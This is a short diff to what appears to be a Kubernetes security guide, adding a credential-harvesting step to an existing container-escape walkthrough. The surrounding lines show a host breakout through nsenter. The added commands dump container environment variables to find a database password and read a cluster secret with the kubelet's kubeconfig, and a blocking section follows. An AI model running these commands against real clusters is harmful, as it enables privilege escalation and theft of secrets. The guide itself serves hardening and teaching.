@@ -40,6 +40,16 @@ kubectl apply -f manifest/root/pod.yaml
 kubectl exec -it root-container -- /bin/sh -c "nsenter --mount=/proc/1/ns/mnt -- /bin/bash"
 ```
 
+- Get credentials
+```
+docker ps -q | xargs docker inspect --format='{{range .Config.Env}}{{println .}}{{end}}' | grep DB_Password
+```
+
+- (References)
+```
+kubectl --kubeconfig /var/lib/kubelet/kubeconfig get secret dummy-secret -o yaml
+```
+
 - How to block
   - RBAC
   - exec
